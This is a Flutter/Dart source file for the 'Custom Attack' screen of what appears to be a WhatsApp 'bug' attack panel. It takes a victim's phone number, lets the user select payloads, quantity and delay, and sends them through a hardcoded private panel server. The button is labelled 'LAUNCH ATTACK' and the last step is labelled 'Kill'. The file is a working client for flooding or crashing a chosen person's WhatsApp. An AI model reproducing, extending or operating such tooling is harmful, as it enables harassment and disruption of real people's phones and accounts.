// ignore_for_file: deprecated_member_use
import 'dart:async';
import 'dart:convert';
import 'dart:ui';
import 'package:flutter/material.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:video_player/video_player.dart';

class CustomAttackPage extends StatefulWidget {
  final String username;
  final String password;
  final String sessionKey;
  final List<Map<String, dynamic>> listPayload;
  final String role;
  final String expiredDate;

  const CustomAttackPage({
    super.key,
    required this.username,
    required this.password,
    required this.sessionKey,
    required this.listPayload,
    required this.role,
    required this.expiredDate,
  });

  @override
  State<CustomAttackPage> createState() => _CustomAttackPageState();
}

class _CustomAttackPageState extends State<CustomAttackPage> with TickerProviderStateMixin {
  // --- Controllers ---
  final targetController = TextEditingController();
  final qtyController = TextEditingController(text: "5");
  final delayController = TextEditingController(text: "100");
  static const String baseUrl = "http://rixzz-privat-panel.sano.biz.id:11490";

  late AnimationController _buttonController;
  late VideoPlayerController _bgController;

  // --- States ---
  bool _isVideoInitialized = false;
  bool _isSending = false;
  List<String> selectedBugs = [];
  String _senderType = "global";

  // --- Theme Colors (Cyber Red Glass) ---
  final Color primaryRed = const Color(0xFFD50000);
  final Color darkRed = const Color(0xFF8B0000);
  final Color glassBase = const Color(0xFF000000).withOpacity(0.4);
  final Color glassBorder = const Color(0xFFFFFFFF).withOpacity(0.1);

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _initializeBackground();
    _setDefaultBugs();
  }

  void _initializeAnimations() {
    _buttonController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 150),
    );
  }

  void _initializeBackground() {
    _bgController = VideoPlayerController.asset('assets/videos/bg.mp4')
      ..initialize().then((_) {
        if (mounted) {
          setState(() => _isVideoInitialized = true);
          _bgController.setLooping(true);
          _bgController.play();
          _bgController.setVolume(0);
        }
      }).catchError((e) => debugPrint("Video Error: $e"));
  }

  void _setDefaultBugs() {
    if (widget.listPayload.isNotEmpty) {
      selectedBugs.add(widget.listPayload[0]['bug_id']);
    }
  }

  @override
  void dispose() {
    _buttonController.dispose();
    _bgController.dispose();
    targetController.dispose();
    qtyController.dispose();
    delayController.dispose();
    super.dispose();
  }

  // --- LOGIC ---

  String? formatPhoneNumber(String input) {
    final cleaned = input.replaceAll(RegExp(r'[^\d]'), '');
    if (cleaned.startsWith('0') || cleaned.length < 8) return null;
    return cleaned;
  }

  Future<void> _sendCustomBug() async {
    if (_isSending) return;
    await _buttonController.forward();
    await _buttonController.reverse();

    final target = formatPhoneNumber(targetController.text.trim());
    if (target == null) {
      _showPopup("Invalid Target", "Use international format (628xxx).", isError: true);
      return;
    }

    if (selectedBugs.isEmpty) {
      _showPopup("No Payload", "Select at least one payload.", isError: true);
      return;
    }

    setState(() => _isSending = true);

    try {
      final bugsParam = selectedBugs.join(',');
      final qty = qtyController.text;
      final delay = delayController.text;
      final url = "$baseUrl/api/whatsapp/customBug?key=${widget.sessionKey}&target=$target&bug=$bugsParam&qty=$qty&delay=$delay&senderType=$_senderType";
      
      final res = await http.get(Uri.parse(url));
      final data = jsonDecode(res.body);

      setState(() => _isSending = false);

      if (data["valid"] == false) {
        _showPopup("Failed", data["message"] ?? "Execution failed.", isError: true);
      } else {
        _showSuccessPopup(target, data["details"]);
      }
    } catch (_) {
      setState(() => _isSending = false);
      _showPopup("Error", "Check your connection.", isError: true);
    }
  }

  // --- UI WIDGETS ---

  Widget _glassMorphism({required Widget child, double blur = 10, double opacity = 0.4}) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(20),
      child: BackdropFilter(
        filter: ImageFilter.blur(sigmaX: blur, sigmaY: blur),
        child: Container(
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(opacity),
            borderRadius: BorderRadius.circular(20),
            border: Border.all(color: glassBorder, width: 1.5),
          ),
          child: child,
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      body: Stack(
        children: [
          // 1. Full Screen Video Background
          if (_isVideoInitialized)
            SizedBox.expand(
              child: FittedBox(
                fit: BoxFit.cover,
                child: SizedBox(
                  width: _bgController.value.size.width,
                  height: _bgController.value.size.height,
                  child: VideoPlayer(_bgController),
                ),
              ),
            ),
          // Gradient Overlay to darken video
          Container(color: Colors.black.withOpacity(0.6)),

          // 2. Main Content
          SafeArea(
            child: SingleChildScrollView(
              padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
              child: Column(
                children: [
                  _buildProfileCard(),
                  const SizedBox(height: 20),
                  _buildStepIconsCard(),
                  const SizedBox(height: 20),
                  _buildMainInputArea(),
                  const SizedBox(height: 25),
                  _buildActionButton(),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildProfileCard() {
    return _glassMorphism(
      child: Padding(
        padding: const EdgeInsets.all(15),
        child: Row(
          children: [
            CircleAvatar(
              radius: 25,
              backgroundColor: primaryRed,
              child: const CircleAvatar(
                radius: 23,
                backgroundImage: AssetImage('assets/images/pp.jpg'),
              ),
            ),
            const SizedBox(width: 15),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(widget.username, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16, fontFamily: 'Orbitron')),
                  Text("Role: ${widget.role.toUpperCase()} • Exp: ${widget.expiredDate}", 
                    style: const TextStyle(color: Colors.white60, fontSize: 10, fontFamily: 'ShareTechMono')),
                ],
              ),
            ),
            Icon(FontAwesomeIcons.shieldHalved, color: primaryRed, size: 20),
          ],
        ),
      ),
    );
  }

  Widget _buildStepIconsCard() {
    return _glassMorphism(
      child: Padding(
        padding: const EdgeInsets.symmetric(vertical: 20),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            _stepIcon(FontAwesomeIcons.keyboard, "Input", true),
            _verticalLine(),
            _stepIcon(FontAwesomeIcons.bug, "Bug", true),
            _verticalLine(),
            _stepIcon(FontAwesomeIcons.sliders, "Setup", true),
            _verticalLine(),
            _stepIcon(FontAwesomeIcons.bolt, "Kill", false),
          ],
        ),
      ),
    );
  }

  Widget _stepIcon(IconData icon, String label, bool active) {
    return Column(
      children: [
        Icon(icon, color: active ? primaryRed : Colors.white24, size: 20),
        const SizedBox(height: 5),
        Text(label, style: TextStyle(color: active ? Colors.white70 : Colors.white24, fontSize: 10, fontFamily: 'Orbitron')),
      ],
    );
  }

  Widget _verticalLine() {
    return Container(width: 1, height: 25, color: Colors.white10);
  }

  Widget _buildMainInputArea() {
    return _glassMorphism(
      opacity: 0.2,
      child: Padding(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // Target Input Section
            Row(
              children: [
                Icon(FontAwesomeIcons.penToSquare, color: primaryRed, size: 14),
                const SizedBox(width: 8),
                const Text("Input Number Target", style: TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
              ],
            ),
            const SizedBox(height: 12),
            Container(
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.05),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white12),
              ),
              child: TextField(
                controller: targetController,
                style: const TextStyle(color: Colors.white, fontFamily: 'ShareTechMono'),
                keyboardType: TextInputType.phone,
                decoration: InputDecoration(
                  hintText: "628xxxxxxxx",
                  hintStyle: const TextStyle(color: Colors.white24),
                  border: InputBorder.none,
                  prefixIcon: Row(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      const SizedBox(width: 15),
                      const Icon(FontAwesomeIcons.globe, color: Colors.white, size: 16),
                      const SizedBox(width: 12),
                      Container(width: 1.5, height: 20, color: Colors.white24),
                      const SizedBox(width: 12),
                    ],
                  ),
                ),
              ),
            ),

            const SizedBox(height: 25),

            // Payload Selection Section
            const Text("Select Payloads", style: TextStyle(color: Colors.white70, fontSize: 11, fontFamily: 'Orbitron')),
            const SizedBox(height: 12),
            _buildPayloadWrap(),

            const SizedBox(height: 25),

            // Config Section
            Row(
              children: [
                Expanded(child: _buildConfigField(qtyController, "QTY", FontAwesomeIcons.layerGroup)),
                const SizedBox(width: 15),
                Expanded(child: _buildConfigField(delayController, "DELAY", FontAwesomeIcons.clock, enabled: _senderType == "private")),
              ],
            ),
            const SizedBox(height: 15),
            _buildSenderToggle(),
          ],
        ),
      ),
    );
  }

  Widget _buildPayloadWrap() {
    return Wrap(
      spacing: 8,
      runSpacing: 8,
      children: widget.listPayload.map((bug) {
        final isSelected = selectedBugs.contains(bug['bug_id']);
        return GestureDetector(
          onTap: () {
            setState(() {
              isSelected ? selectedBugs.remove(bug['bug_id']) : selectedBugs.add(bug['bug_id']);
            });
          },
          child: AnimatedContainer(
            duration: const Duration(milliseconds: 200),
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
            decoration: BoxDecoration(
              color: isSelected ? primaryRed.withOpacity(0.3) : Colors.white.withOpacity(0.05),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: isSelected ? primaryRed : Colors.white12),
            ),
            child: Text(bug['bug_name'], style: TextStyle(color: isSelected ? Colors.white : Colors.white54, fontSize: 11, fontFamily: 'ShareTechMono')),
          ),
        );
      }).toList(),
    );
  }

  Widget _buildConfigField(TextEditingController ctrl, String label, IconData icon, {bool enabled = true}) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(label, style: const TextStyle(color: Colors.white38, fontSize: 9, fontFamily: 'Orbitron')),
        const SizedBox(height: 6),
        Container(
          height: 45,
          decoration: BoxDecoration(
            color: enabled ? Colors.white.withOpacity(0.05) : Colors.black38,
            borderRadius: BorderRadius.circular(10),
            border: Border.all(color: Colors.white12),
          ),
          child: TextField(
            controller: ctrl,
            enabled: enabled,
            style: TextStyle(color: enabled ? Colors.white : Colors.white24, fontSize: 13, fontFamily: 'ShareTechMono'),
            keyboardType: TextInputType.number,
            textAlign: TextAlign.center,
            decoration: InputDecoration(border: InputBorder.none, prefixIcon: Icon(icon, color: primaryRed.withOpacity(0.5), size: 12)),
          ),
        ),
      ],
    );
  }

  Widget _buildSenderToggle() {
    return Row(
      children: [
        Expanded(child: _senderBtn("global", FontAwesomeIcons.earthAmericas)),
        const SizedBox(width: 10),
        Expanded(child: _senderBtn("private", FontAwesomeIcons.userSecret)),
      ],
    );
  }

  Widget _senderBtn(String type, IconData icon) {
    bool isSel = _senderType == type;
    return GestureDetector(
      onTap: () => setState(() => _senderType = type),
      child: Container(
        height: 40,
        decoration: BoxDecoration(
          color: isSel ? primaryRed.withOpacity(0.2) : Colors.transparent,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: isSel ? primaryRed : Colors.white12),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, color: isSel ? primaryRed : Colors.white24, size: 14),
            const SizedBox(width: 8),
            Text(type.toUpperCase(), style: TextStyle(color: isSel ? Colors.white : Colors.white24, fontSize: 10, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
          ],
        ),
      ),
    );
  }

  Widget _buildActionButton() {
    return GestureDetector(
      onTap: _isSending ? null : _sendCustomBug,
      child: AnimatedBuilder(
        animation: _buttonController,
        builder: (context, child) {
          return Transform.scale(
            scale: 1.0 - (_buttonController.value * 0.05),
            child: Container(
              height: 55,
              width: double.infinity,
              decoration: BoxDecoration(
                gradient: LinearGradient(colors: [primaryRed, darkRed]),
                borderRadius: BorderRadius.circular(15),
                boxShadow: [BoxShadow(color: primaryRed.withOpacity(0.3), blurRadius: 15, offset: const Offset(0, 5))],
              ),
              child: Center(
                child: _isSending
                    ? const SizedBox(width: 20, height: 20, child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                    : const Row(
                        mainAxisAlignment: MainAxisAlignment.center,
                        children: [
                          Icon(FontAwesomeIcons.skullCrossbones, color: Colors.white, size: 18),
                          const SizedBox(width: 12),
                          Text("LAUNCH ATTACK", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, letterSpacing: 1.5, fontFamily: 'Orbitron')),
                        ],
                      ),
              ),
            ),
          );
        },
      ),
    );
  }

  void _showPopup(String title, String msg, {bool isError = false}) {
    showDialog(
      context: context,
      builder: (_) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 5, sigmaY: 5),
        child: AlertDialog(
          backgroundColor: const Color(0xFF151515),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(15), side: BorderSide(color: isError ? primaryRed : Colors.green)),
          title: Text(title, style: const TextStyle(color: Colors.white, fontFamily: 'Orbitron', fontSize: 16)),
          content: Text(msg, style: const TextStyle(color: Colors.white70, fontFamily: 'ShareTechMono')),
          actions: [TextButton(onPressed: () => Navigator.pop(context), child: const Text("OK", style: TextStyle(color: Colors.white)))],
        ),
      ),
    );
  }

  void _showSuccessPopup(String target, Map<String, dynamic> details) {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => BackdropFilter(
        filter: ImageFilter.blur(sigmaX: 10, sigmaY: 10),
        child: Dialog(
          backgroundColor: const Color(0xFF111111),
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20), side: BorderSide(color: primaryRed)),
          child: Padding(
            padding: const EdgeInsets.all(25),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Icon(FontAwesomeIcons.checkDouble, color: Colors.green, size: 40),
                const SizedBox(height: 15),
                const Text("SUCCESS SENT", style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontFamily: 'Orbitron')),
                const Divider(color: Colors.white10, height: 30),
                _rowInfo("Target", target),
                _rowInfo("Payloads", "${selectedBugs.length} Selected"),
                _rowInfo("Type", _senderType.toUpperCase()),
                const SizedBox(height: 25),
                SizedBox(
                  width: double.infinity,
                  child: ElevatedButton(
                    onPressed: () => Navigator.pop(context),
                    style: ElevatedButton.styleFrom(backgroundColor: primaryRed),
                    child: const Text("DISMISS", style: TextStyle(color: Colors.white, fontFamily: 'Orbitron')),
                  ),
                )
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _rowInfo(String l, String v) {
    return Padding(
      padding: const EdgeInsets.symmetric(vertical: 4),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceBetween,
        children: [
          Text(l, style: const TextStyle(color: Colors.white38, fontSize: 12, fontFamily: 'ShareTechMono')),
          Text(v, style: TextStyle(color: primaryRed, fontSize: 12, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono')),
        ],
      ),
    );
  }
}
